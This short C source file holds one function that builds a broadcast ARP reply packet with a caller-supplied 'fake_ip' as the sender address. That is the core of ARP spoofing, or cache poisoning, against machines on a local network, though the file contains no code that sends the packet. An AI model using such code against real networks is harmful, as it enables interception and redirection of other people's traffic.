#include "stdafx.h"
u_char *BuildPacket(u_char *mac,u_int dest_ip,u_int fake_ip)
{
	static struct arp_packet packet;
	memset(packet.arp_h.dest_mac,0xff,6);
	memcpy(packet.arp_h.src_mac,mac,6);
	packet.arp_h.ethernet=htons(0x0806);
	packet.arp_b.hardware_type=htons(0x0001);
	packet.arp_b.protocol_type=htons(0x0800);
	packet.arp_b.hardware_len=6;
	packet.arp_b.protocol_len=4;
	packet.arp_b.option=htons(0x0002);
	memcpy(packet.arp_b.src_mac,mac,6);
	packet.arp_b.src_ip=fake_ip;
	memset(packet.arp_b.dest_mac,0,6);
	packet.arp_b.dest_ip=dest_ip;
	return (u_char*)&packet;
}